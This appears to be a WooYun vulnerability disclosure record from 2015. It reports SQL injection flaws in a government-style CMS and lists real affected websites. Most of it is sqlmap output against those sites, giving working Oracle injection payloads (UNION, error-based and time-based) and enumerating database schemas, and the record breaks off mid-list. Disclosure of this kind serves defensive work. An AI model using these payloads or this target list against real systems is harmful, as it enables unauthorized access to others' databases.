{"id": 2392, "wybug_id": "wooyun-2015-0115137", "wybug_title": "瑞合信政务类cms SA权限注射打包", "wybug_corp": "瑞合信网络科技", "wybug_author": "Hero", "wybug_date": "2015-05-21 16:21", "wybug_open_date": "2015-08-23 19:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向公众公开  简要描述： 打包应该不会小厂商吧！把前几个分开的都忽略掉吧。。sql 详细说明：  官方网站:http://www.rhxwl.com/Server.asp案例:http://www.linhaihome.com/http://jh.zjmy.net/http://www.lqmyjj.com/http://www.sxjhjj.com/ http://www.sxkfqjj.com/http://www.sxpjgtmyjj.com/http://www.wlmyjj.com/ http://jh.zjmy.net/http://www.hyqmyjj.com/ http://www.jjmyjj.com/http://www.yhmyjj.com/ http://www.ttmyjj.com/http://www.xjmyjj.com/ http://www.lqmyjj.com/#1 漏洞页面:zcfg/list.asp数据实例证明： www.lqmyjj.com \n[root@Hacker~]# Sqlmap -r c:/1.txt --dbs sqlmap/1.0-dev - automatic SQL injection and database takeover tool http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon sible for any misuse or damage caused by this program [*] starting at 22:50:30 [22:50:30] [INFO] parsing HTTP request from 'c:/1.txt' [22:50:30] [WARNING] it appears that you have provided tainted parameter values ('SearchText=1'') with most probably leftover chars from manual SQL injection te sts (;()') or non-valid numerical value. Please, always use only valid parameter values so sqlmap could be able to properly run Are you sure you want to continue? [y/N] y [22:50:31] [INFO] resuming back-end DBMS 'oracle' [22:50:31] [INFO] testing connection to the target url [22:50:32] [INFO] heuristics detected web page charset 'GB2312' [22:50:32] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests sqlmap identified the following injection points with a total of 0 HTTP(s) reque sts: --- Place: POST Parameter: SearchText Type: UNION query Title: Generic UNION query (NULL) - 5 columns Payload: SearchText=1' UNION ALL SELECT NULL, CHR(58)||CHR(105)||CHR(120)||C HR(106)||CHR(58)||CHR(86)||CHR(70)||CHR(82)||CHR(75)||CHR(87)||CHR(111)||CHR(112 )||CHR(102)||CHR(81)||CHR(79)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58), NU LL, NULL, NULL FROM DUAL-- &b1=search --- [22:50:32] [INFO] the back-end DBMS is Oracle web server operating system: Windows 2003 web application technology: ASP.NET, Microsoft IIS 6.0 back-end DBMS: Oracle [22:50:32] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes [22:50:32] [INFO] fetching database (schema) names [22:50:32] [INFO] heuristics detected web page charset 'ISO-8859-2' [22:50:33] [WARNING] reflective value(s) found and filtering out available databases [25]: [*] CTXSYS [*] HR [*] MDSYS [*] ODM [*] ODM_MTR [*] OE [*] OLAPSYS [*] ORDSYS [*] OUTLN [*] PM [*] QS [*] QS_CBADM [*] QS_CS [*] QS_ES [*] QS_OS [*] QS_WS [*] RMAN [*] SCOTT [*] SH [*] SYS [*] SYSTEM [*] WKSYS [*] WMSYS [*] XDB [*] ZJGSXH [22:50:33] [WARNING] HTTP error codes detected during testing: 500 (Internal Server Error) - 1 times [22:50:33] [INFO] fetched data logged to text files under 'C:\\tools\\SQLMAP~1\\SQL MAP~1\\Bin\\output\\www.lqmyjj.com' [*] shutting down at 22:50:33\n \n\n#2  漏洞文件: admin_manage/Login.asp \nPOST /admin_manage/Login.asp?no=eshop HTTP/1.1 Host: www.linhaihome.com Connection: keep-alive Content-Length: 58 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Origin: http://www.linhaihome.com User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://www.linhaihome.com/admin_manage/Login.asp Accept-Encoding: gzip,deflate,sdch Accept-Language: zh-CN,zh;q=0.8 Cookie: ASPSESSIONIDSAASRSRS=JGDGDEKBPMNICLJHKFNJCGAE Name=admin%A1%AE&Pwd=admin&Submit=%B5%C7%C2%BD%CF%B5%CD%B3\n数据实例证明: http://www.linhaihome.com/admin_manage/Login.asp \n[root@Hacker~]# Sqlmap -r c:/1.txt --dbs sqlmap/1.0-dev - automatic SQL injection and database takeover tool http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon sible for any misuse or damage caused by this program [*] starting at 23:09:19 [23:09:19] [INFO] parsing HTTP request from 'c:/1.txt' [23:09:19] [INFO] resuming back-end DBMS 'oracle' [23:09:19] [INFO] testing connection to the target url sqlmap got a 302 redirect to 'http://www.linhaihome.com:80/admin_manage/Loginsb. asp'. Do you want to follow? [Y/n] y [23:09:21] [INFO] heuristics detected web page charset 'GB2312' [23:09:21] [WARNING] cannot properly display Unicode characters inside Windows O S command prompt (http://bugs.python.org/issue1602). All unhandled occurances wi ll result in replacement with '?' character. Please, find proper character repre sentation inside corresponding output files. sqlmap identified the following injection points with a total of 0 HTTP(s) reque sts: --- Place: POST Parameter: Pwd Type: error-based Title: Oracle AND error-based - WHERE or HAVING clause (XMLType) Payload: Name=admin??&Pwd=admin' AND 5752=(SELECT UPPER(XMLType(CHR(60)||CHR (58)||CHR(119)||CHR(103)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (5752=5752) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(101)||CHR(97)||CHR(111)||CHR(58)||CHR(62 ))) FROM DUAL) AND 'rhEJ'='rhEJ&Submit=????? Type: UNION query Title: Generic UNION query (NULL) - 13 columns Payload: Name=admin??&Pwd=admin' UNION ALL SELECT NULL, NULL, NULL, NULL, NU LL, CHR(58)||CHR(119)||CHR(103)||CHR(115)||CHR(58)||CHR(103)||CHR(85)||CHR(113)| |CHR(79)||CHR(78)||CHR(105)||CHR(66)||CHR(98)||CHR(87)||CHR(117)||CHR(58)||CHR(1 01)||CHR(97)||CHR(111)||CHR(58), NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM D UAL-- &Submit=????? Type: AND/OR time-based blind Title: Oracle AND time-based blind Payload: Name=admin??&Pwd=admin' AND 9073=DBMS_PIPE.RECEIVE_MESSAGE(CHR(78)| |CHR(114)||CHR(77)||CHR(68),5) AND 'pRuM'='pRuM&Submit=????? Place: POST Parameter: Name Type: error-based Title: Oracle AND error-based - WHERE or HAVING clause (XMLType) Payload: Name=admin??' AND 9904=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR( 119)||CHR(103)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (9904=9904) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(101)||CHR(97)||CHR(111)||CHR(58)||CHR(62))) FROM D UAL) AND 'SYjX'='SYjX&Pwd=admin&Submit=????? Type: UNION query Title: Generic UNION query (NULL) - 13 columns Payload: Name=admin??' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, CHR(58 )||CHR(119)||CHR(103)||CHR(115)||CHR(58)||CHR(86)||CHR(84)||CHR(73)||CHR(108)||C HR(108)||CHR(72)||CHR(99)||CHR(103)||CHR(102)||CHR(108)||CHR(58)||CHR(101)||CHR( 97)||CHR(111)||CHR(58), NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM DUAL-- &Pw d=admin&Submit=????? Type: AND/OR time-based blind Title: Oracle AND time-based blind Payload: Name=admin??' AND 3597=DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(73)| |CHR(111)||CHR(110),5) AND 'OfXl'='OfXl&Pwd=admin&Submit=????? --- there were multiple injection points, please select the one to use for following injections: [0] place: POST, parameter: Pwd, type: Single quoted string (default) [1] place: POST, parameter: Name, type: Single quoted string [q] Quit > 1 [23:09:23] [INFO] the back-end DBMS is Oracle web server operating system: Windows 2003 web application technology: ASP.NET, Microsoft IIS 6.0 back-end DBMS: Oracle [23:09:23] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes [23:09:23] [INFO] fetching database (schema) names [23:09:23] [INFO] the SQL query used returns 25 entries available databases [25]: [*] CTXSYS [*] HR [*] MDSYS [*] ODM [*] ODM_MTR [*] OE [*] OLAPSYS [*] ORDSYS [*] OUTLN [*] PM [*] QS [*] QS_CBADM [*] QS_CS [*] QS_ES [*] QS_OS [*] QS_WS [*] RMAN [*] SCOTT [*] SH [*] SYS [*] SYSTEM [*] WKSYS [*] WMSYS [*] XDB [*] ZJGSXH [23:09:24] [INFO] fetched data logged to text files under 'C:\\tools\\SQLMAP~1\\SQL MAP~1\\Bin\\output\\www.linhaihome.com' [*] shutting down at 23:09:24\n \n\n http://jh.zjmy.net/admin_manage/Login.asp \n[root@Hacker~]# Sqlmap -r c:/1.txt --dbs sqlmap/1.0-dev - automatic SQL injection and database takeover tool http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon sible for any misuse or damage caused by this program [*] starting at 23:16:22 [23:16:22] [INFO] parsing HTTP request from 'c:/1.txt' [23:16:22] [INFO] resuming back-end DBMS 'oracle' [23:16:22] [INFO] testing connection to the target url sqlmap got a 302 redirect to 'http://jh.zjmy.net:80/admin_manage/Loginsb.asp'. D o you want to follow? [Y/n] y [23:16:24] [INFO] heuristics detected web page charset 'GB2312' [23:16:24] [WARNING] cannot properly display Unicode characters inside Windows O S command prompt (http://bugs.python.org/issue1602). All unhandled occurances wi ll result in replacement with '?' character. Please, find proper character repre sentation inside corresponding output files. sqlmap identified the following injection points with a total of 0 HTTP(s) reque sts: --- Place: POST Parameter: Name Type: error-based Title: Oracle AND error-based - WHERE or HAVING clause (XMLType) Payload: Name=admin??' AND 7784=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR( 106)||CHR(115)||CHR(102)||CHR(58)||(SELECT (CASE WHEN (7784=7784) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(102)||CHR(108)||CHR(107)||CHR(58)||CHR(62))) FROM DUAL) AND 'qiXk'='qiXk&Pwd=admin&Submit=????? Type: UNION query Title: Generic UNION query (NULL) - 13 columns Payload: Name=admin??' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, CHR(58 )||CHR(106)||CHR(115)||CHR(102)||CHR(58)||CHR(83)||CHR(86)||CHR(111)||CHR(82)||C HR(110)||CHR(97)||CHR(86)||CHR(104)||CHR(90)||CHR(99)||CHR(58)||CHR(102)||CHR(10 8)||CHR(107)||CHR(58), NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM DUAL-- &Pwd =admin&Submit=????? Type: AND/OR time-based blind Title: Oracle AND time-based blind Payload: Name=admin??' AND 8163=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(103)| |CHR(81)||CHR(99),5) AND 'Qhgv'='Qhgv&Pwd=admin&Submit=????? Place: POST Parameter: Pwd Type: error-based Title: Oracle AND error-based - WHERE or HAVING clause (XMLType) Payload: Name=admin??&Pwd=admin' AND 9459=(SELECT UPPER(XMLType(CHR(60)||CHR (58)||CHR(106)||CHR(115)||CHR(102)||CHR(58)||(SELECT (CASE WHEN (9459=9459) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(102)||CHR(108)||CHR(107)||CHR(58)||CHR(6 2))) FROM DUAL) AND 'jUsL'='jUsL&Submit=????? Type: UNION query Title: Generic UNION query (NULL) - 13 columns Payload: Name=admin??&Pwd=admin' UNION ALL SELECT NULL, NULL, NULL, NULL, NU LL, CHR(58)||CHR(106)||CHR(115)||CHR(102)||CHR(58)||CHR(85)||CHR(112)||CHR(80)|| CHR(112)||CHR(74)||CHR(118)||CHR(105)||CHR(107)||CHR(111)||CHR(105)||CHR(58)||CH R(102)||CHR(108)||CHR(107)||CHR(58), NULL, NULL, NULL, NULL, NULL, NULL, NULL FR OM DUAL-- &Submit=????? Type: AND/OR time-based blind Title: Oracle AND time-based blind Payload: Name=admin??&Pwd=admin' AND 2675=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121) ||CHR(106)||CHR(115)||CHR(74),5) AND 'YjIO'='YjIO&Submit=????? --- there were multiple injection points, please select the one to use for following injections: [0] place: POST, parameter: Pwd, type: Single quoted string (default) [1] place: POST, parameter: Name, type: Single quoted string [q] Quit > 1 [23:16:25] [INFO] the back-end DBMS is Oracle web server operating system: Windows 2003 web application technology: ASP.NET, Microsoft IIS 6.0 back-end DBMS: Oracle [23:16:25] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes [23:16:25] [INFO] fetching database (schema) names [23:16:26] [INFO] heuristics detected web page charset 'ascii' [23:16:26] [INFO] the SQL query used returns 25 entries [23:16:26] [INFO] retrieved: \"CTXSYS\" [23:16:27] [INFO] retrieved: \"HR\" [23:16:27] [INFO] retrieved: \"MDSYS\" [23:16:28] [INFO] retrieved: \"ODM\" [23:16:28] [INFO] retrieved: \"ODM_MTR\" [23:16:28] [INFO] retrieved: \"OE\" [23:16:29] [INFO] retrieved: \"OLAPSYS\" [23:16:29] [INFO] retrieved: \"ORDSYS\" [23:16:30] [INFO] retrieved: \"OUTLN\" [23:16:30] [INFO] retrieved: \"PM\" [23:16:30] [INFO] retrieved: \"QS\" [23:16:31] [INFO] retrieved: \"QS_CBADM\" [23:16:31] [INFO] retrieved: \"QS_CS\" [23:16:32] [INFO] retrieved: \"QS_ES\" [23:16:32] [INFO] retrieved: \"QS_OS\" [23:16:32] [INFO] retrieved: \"QS_WS\" [23:16:33] [INFO] retrieved: \"RMAN\" [23:16:33] [INFO] retrieved: \"SCOTT\" [23:16:34] [INFO] retrieved: \"SH\" [23:16:34] [INFO] retrieved: \"SYS\" [23:16:35] [INFO] retrieved: \"SYSTEM\" [23:16:35] [INFO] retrieved: \"WKSYS\" [23:16:35] [INFO] retrieved: \"WMSYS\" [23:16:36] [INFO] retrieved: \"XDB\" [23:16:36] [INFO] retrieved: \"ZJGSXH\" available databases [25]: [*] CTXSYS [*] HR [*] MDSYS [*] ODM [*] ODM_MTR [*] OE [*] OLAPSYS [*] ORDSYS [*] OUTLN [*] PM [*] QS [*] QS_CBADM [*] QS_CS [*] QS_ES [*] QS_OS [*] QS_WS [*] RMAN [*] SCOTT [*] SH [*] SYS [*] SYSTEM [*] WKSYS [*] WMSYS [*] XDB [*] ZJGSXH [23:16:37] [INFO] fetched data logged to text files under 'C:\\tools\\SQLMAP~1\\SQL MAP~1\\Bin\\output\\jh.zjmy.net' [*] shutting down at 23:16:37\n \n\n #3 漏洞文件:bszl/index_xxcx.asp?types=fdtp 数据实例证明: http://www.linhaihome.com/bszl/index_xxcx.asp?types=fdtp \n[root@Hacker~]# Sqlmap -u http://www.linhaihome.com/bszl/index_xxcx.asp?types=fd tp --dbs sqlmap/1.0-dev - automatic SQL injection and database takeover tool http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon sible for any misuse or damage caused by this program [*] starting at 23:31:12 [23:31:12] [INFO] resuming back-end DBMS 'oracle' [23:31:12] [INFO] testing connection to the target url sqlmap identified the following injection points with a total of 0 HTTP(s) reque sts: --- Place: GET Parameter: types Type: error-based Title: Oracle AND error-based - WHERE or HAVING clause (XMLType) Payload: types=fdtp' AND 1173=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(11 9)||CHR(97)||CHR(118)||CHR(58)||(SELECT (CASE WHEN (1173=1173) THEN 1 ELSE 0 END ) FROM DUAL)||CHR(58)||CHR(114)||CHR(100)||CHR(109)||CHR(58)||CHR(62))) FROM DUA L) AND 'loGJ'='loGJ Type: UNION query Title: Generic UNION query (NULL) - 5 columns Payload: types=-4067' UNION ALL SELECT NULL, CHR(58)||CHR(119)||CHR(97)||CHR (118)||CHR(58)||CHR(104)||CHR(115)||CHR(73)||CHR(76)||CHR(68)||CHR(109)||CHR(103 )||CHR(82)||CHR(121)||CHR(79)||CHR(58)||CHR(114)||CHR(100)||CHR(109)||CHR(58), N ULL, NULL, NULL FROM DUAL-- Type: AND/OR time-based blind Title: Oracle AND time-based blind Payload: types=fdtp' AND 3633=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(112)|| CHR(103)||CHR(76),5) AND 'ixdp'='ixdp --- [23:31:13] [INFO] the back-end DBMS is Oracle web server operating system: Windows 2003 web application technology: ASP.NET, Microsoft IIS 6.0, ASP back-end DBMS: Oracle [23:31:13] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes [23:31:13] [INFO] fetching database (schema) names [23:31:13] [INFO] the SQL query used returns 25 entries available databases [25]: [*] CTXSYS [*] HR [*] MDSYS [*] ODM [*] ODM_MTR [*] OE [*] OLAPSYS [*] ORDSYS [*] OUTLN [*] PM [*] QS [*] QS_CBADM [*] QS_CS [*] QS_ES [*] QS_OS [*] QS_WS [*] RMAN [*] SCOTT [*] SH [*] SYS [*] SYSTEM [*] WKSYS [*] WMSYS [*] XDB [*] ZJGSXH [23:31:13] [INFO] fetched data logged to text files under 'C:\\tools\\SQLMAP~1\\SQL MAP~1\\Bin\\output\\www.linhaihome.com' [*] shutting down at 23:31:13\n \n\n #4 漏洞文件:shop_index.asp?no=3310220062608196 数据实例证明: www.linhaihome.com \n[root@Hacker~]# Sqlmap -u http://www.linhaihome.com/shop_index.asp?no=3310220062 608196 --dbs sqlmap/1.0-dev - automatic SQL injection and database takeover tool http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon sible for any misuse or damage caused by this program [*] starting at 23:58:26 [23:58:26] [INFO] resuming back-end DBMS 'oracle' [23:58:26] [INFO] testing connection to the target url sqlmap identified the following injection points with a total of 0 HTTP(s) reque sts: --- Place: GET Parameter: no Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: no=3310220062608196' AND 4483=4483 AND 'yPGk'='yPGk Type: error-based Title: Oracle AND error-based - WHERE or HAVING clause (XMLType) Payload: no=3310220062608196' AND 2219=(SELECT UPPER(XMLType(CHR(60)||CHR(58 )||CHR(101)||CHR(117)||CHR(105)||CHR(58)||(SELECT (CASE WHEN (2219=2219) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(107)||CHR(119)||CHR(120)||CHR(58)||CHR(62)) ) FROM DUAL) AND 'ecTq'='ecTq Type: AND/OR time-based blind Title: Oracle AND time-based blind Payload: no=3310220062608196' AND 4204=DBMS_PIPE.RECEIVE_MESSAGE(CHR(116)||C HR(82)||CHR(120)||CHR(83),5) AND 'URHN'='URHN --- [23:58:53] [INFO] the back-end DBMS is Oracle web server operating system: Windows 2003 web application technology: ASP.NET, Microsoft IIS 6.0, ASP back-end DBMS: Oracle [23:58:53] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes [23:58:53] [INFO] fetching database (schema) names [23:58:53] [INFO] the SQL query used returns 25 entries available databases [25]: [*] CTXSYS [*] HR [*] MDSYS [*] ODM [*] ODM_MTR [*] OE [*] OLAPSYS [*] ORDSYS [*] OUTLN [*] PM [*] QS [*] QS_CBADM [*] QS_CS [*] QS_ES [*] QS_OS [*] QS_WS [*] RMAN [*] SCOTT [*] SH [*] SYS [*] SYSTEM [*] WKSYS [*] WMSYS [*] XDB [*] ZJGSXH [23:58:53] [INFO] fetched data logged to text files under 'C:\\tools\\SQLMAP~1\\SQL MAP~1\\Bin\\output\\www.linhaihome.com' [*] shutting down at 23:58:53\n \n\n www.lqmyjj.com \n[root@Hacker~]# Sqlmap -u http://www.lqmyjj.com/shop_index.asp?no=33102200626081 96 --dbs sqlmap/1.0-dev - automatic SQL injection and database takeover tool http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon sible for any misuse or damage caused by this program [*] starting at 23:56:32 [23:56:32] [INFO] testing connection to the target url [23:56:36] [INFO] testing if the url is stable, wait a few seconds [23:56:40] [INFO] url is stable [23:56:40] [INFO] testing if GET parameter 'no' is dynamic [23:56:44] [WARNING] GET parameter 'no' appears to be not dynamic [23:56:44] [INFO] heuristics detected web page charset 'GB2312' [23:56:44] [INFO] heuristic test shows that GET parameter 'no' might be injectab le (possible DBMS: Oracle) [23:56:44] [INFO] testing for SQL injection on GET parameter 'no' [23:56:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [23:56:49] [INFO] GET parameter 'no' seems to be 'AND boolean-based blind - WHER E or HAVING clause' injectable (with --string=\"\\ufffd\\ufffd\\ufffd\\u02fe\\ufffd\\uf ffd\\ufffd\\u01a3\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\u023a\\ufffd\\ufffd\\ufff d\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\u07b9\\ufffd\\u02fe\" ) [23:56:49] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLT ype)' [23:56:49] [INFO] GET parameter 'no' is 'Oracle AND error-based - WHERE or HAVIN G clause (XMLType)' injectable [23:56:49] [INFO] testing 'Oracle AND time-based blind' [23:57:31] [INFO] GET parameter 'no' is 'Oracle AND time-based blind' injectable [23:57:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' [23:57:31] [INFO] automatically extending ranges for UNION query injection techn ique tests as there is at least one other potential injection technique found [23:57:40] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending t he range for current UNION query injection technique test [23:58:03] [INFO] target url appears to have 4 columns in query injection not exploitable with NULL values. Do you want to try with a random int eger value for option '--union-char'? [Y/n] y [23:58:49] [WARNING] if UNION based SQL injection is not detected, please consid er forcing the back-end DBMS (e.g. --dbms=mysql) GET parameter 'no' is vulnerable. Do you want to keep testing the others (if any )? [y/N] y sqlmap identified the following injection points with a total of 34 HTTP(s) requ ests: --- Place: GET Parameter: no Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: no=3310220062608196' AND 8594=8594 AND 'eBzK'='eBzK Type: error-based Title: Oracle AND error-based - WHERE or HAVING clause (XMLType) Payload: no=3310220062608196' AND 6205=(SELECT UPPER(XMLType(CHR(60)||CHR(58 )||CHR(97)||CHR(119)||CHR(121)||CHR(58)||(SELECT (CASE WHEN (6205=6205) THEN 1 E LSE 0 END) FROM DUAL)||CHR(58)||CHR(115)||CHR(102)||CHR(108)||CHR(58)||CHR(62))) FROM DUAL) AND 'eOVq'='eOVq Type: AND/OR time-based blind Title: Oracle AND time-based blind Payload: no=3310220062608196' AND 5869=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CH R(88)||CHR(82)||CHR(88),5) AND 'JwJr'='JwJr --- [23:58:53] [INFO] the back-end DBMS is Oracle web server operating system: Windows 2003 web application technology: ASP.NET, Microsoft IIS 6.0, ASP back-end DBMS: Oracle [23:58:53] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes [23:58:53] [INFO] fetching database (schema) names [23:58:53] [INFO] the SQL query used returns 25 entries [23:58:53] [INFO] retrieved: CTXSYS [23:58:54] [INFO] retrieved: HR [23:58:54] [INFO] retrieved: MDSYS [23:58:54] [INFO] retrieved: ODM [23:58:54] [INFO] retrieved: ODM_MTR [23:58:55] [INFO] retrieved: OE [23:58:55] [INFO] retrieved: OLAPSYS [23:58:55] [INFO] retrieved: ORDSYS [23:58:56] [INFO] retrieved: OUTLN [23:58:56] [INFO] retrieved: PM [23:58:56] [INFO] retrieved: QS [23:58:56] [INFO] retrieved: QS_CBADM [23:58:57] [INFO] retrieved: QS_CS [23:58:57] [INFO] retrieved: QS_ES [23:58:57] [INFO] retrieved: QS_OS [23:58:57] [INFO] retrieved: QS_WS [23:58:58] [INFO] retrieved: RMAN [23:58:58] [INFO] retrieved: SCOTT [23:58:58] [INFO] retrieved: SH [23:58:58] [INFO] retrieved: SYS [23:58:58] [INFO] retrieved: SYSTEM [23:58:59] [INFO] retrieved: WKSYS [23:58:59] [INFO] retrieved: WMSYS [23:58:59] [INFO] retrieved: XDB [23:58:59] [INFO] retrieved: ZJGSXH available databases [25]: [*] CTXSYS [*] HR [*] MDSYS [*] ODM [*] ODM_MTR [*] OE [*] OLAPSYS [*] ORDSYS [*] OUTLN [*] PM [*] QS [*] QS_CBADM [*] QS_CS [*] QS_ES [*] QS_OS [*] QS_WS [*] RMAN [*] SCOTT [*] SH [*] SYS [*] SYSTEM [*] WKSYS [*] WMSYS [*] XDB [*] ZJGSXH [23:58:59] [WARNING] HTTP error codes detected during testing: 500 (Internal Server Error) - 54 times [23:58:59] [INFO] fetched data logged to text files under 'C:\\tools\\SQLMAP~1\\SQL MAP~1\\Bin\\output\\www.lqmyjj.com' [*] shutting down at 23:58:59\n \n\n#5 漏洞文件:qyzp/detail.asp?id=4256 数据实例证明: www.linhaihome.com \n[root@Hacker~]# Sqlmap -u http://www.linhaihome.com/qyzp/detail.asp?id=4256 --db s sqlmap/1.0-dev - automatic SQL injection and database takeover tool http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon sible for any misuse or damage caused by this program [*] starting at 00:12:01 [00:12:01] [INFO] testing connection to the target url [00:12:01] [INFO] heuristics detected web page charset 'ISO-8859-2' [00:12:01] [INFO] testing if the url is stable, wait a few seconds [00:12:03] [INFO] url is stable [00:12:03] [INFO] testing if GET parameter 'id' is dynamic [00:12:03] [INFO] heuristics detected web page charset 'GB2312' [00:12:03] [INFO] confirming that GET parameter 'id' is dynamic [00:12:03] [INFO] GET parameter 'id' is dynamic [00:12:03] [INFO] heuristic test shows that GET parameter 'id' might be injectab le (possible DBMS: Oracle) [00:12:03] [INFO] testing for SQL injection on GET parameter 'id' [00:12:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [00:12:04] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLT ype)' [00:12:05] [INFO] GET parameter 'id' is 'Oracle AND error-based - WHERE or HAVIN G clause (XMLType)' injectable [00:12:05] [INFO] testing 'Oracle AND time-based blind' [00:12:15] [INFO] GET parameter 'id' is 'Oracle AND time-based blind' injectable [00:12:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' [00:12:15] [INFO] automatically extending ranges for UNION query injection techn ique tests as there is at least one other potential injection technique found GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any )? [y/N] y sqlmap identified the following injection points with a total of 35 HTTP(s) requ ests: --- Place: GET Parameter: id Type: error-based Title: Oracle AND error-based - WHERE or HAVING clause (XMLType) Payload: id=4256 AND 2893=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)|| CHR(99)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (2893=2893) THEN 1 ELSE 0 END) FR OM DUAL)||CHR(58)||CHR(105)||CHR(103)||CHR(115)||CHR(58)||CHR(62))) FROM DUAL) Type: AND/OR time-based blind Title: Oracle AND time-based blind Payload: id=4256 AND 3572=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(74)||CHR(7 4)||CHR(104),5) --- [00:13:05] [INFO] the back-end DBMS is Oracle web server operating system: Windows 2003 web application technology: ASP.NET, Microsoft IIS 6.0, ASP back-end DBMS: Oracle [00:13:05] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes [00:13:05] [INFO] fetching database (schema) names [00:13:05] [INFO] the SQL query used returns 25 entries [00:13:05] [INFO] retrieved: CTXSYS [00:13:05] [INFO] retrieved: HR [00:13:06] [INFO] retrieved: MDSYS [00:13:06] [INFO] retrieved: ODM [00:13:06] [INFO] retrieved: ODM_MTR [00:13:06] [INFO] retrieved: OE [00:13:07] [INFO] retrieved: OLAPSYS [00:13:07] [INFO] retrieved: ORDSYS [00:13:07] [INFO] retrieved: OUTLN [00:13:07] [INFO] retrieved: PM [00:13:07] [INFO] retrieved: QS [00:13:08] [INFO] retrieved: QS_CBADM [00:13:08] [INFO] retrieved: QS_CS [00:13:08] [INFO] retrieved: QS_ES [00:13:08] [INFO] retrieved: QS_OS [00:13:09] [INFO] retrieved: QS_WS [00:13:09] [INFO] retrieved: RMAN [00:13:09] [INFO] retrieved: SCOTT [00:13:09] [INFO] retrieved: SH [00:13:10] [INFO] retrieved: SYS [00:13:10] [INFO] retrieved: SYSTEM [00:13:10] [INFO] retrieved: WKSYS [00:13:10] [INFO] retrieved: WMSYS [00:13:11] [INFO] retrieved: XDB [00:13:11] [INFO] retrieved: ZJGSXH available databases [25]: [*] CTXSYS [*] HR [*] MDSYS [*] 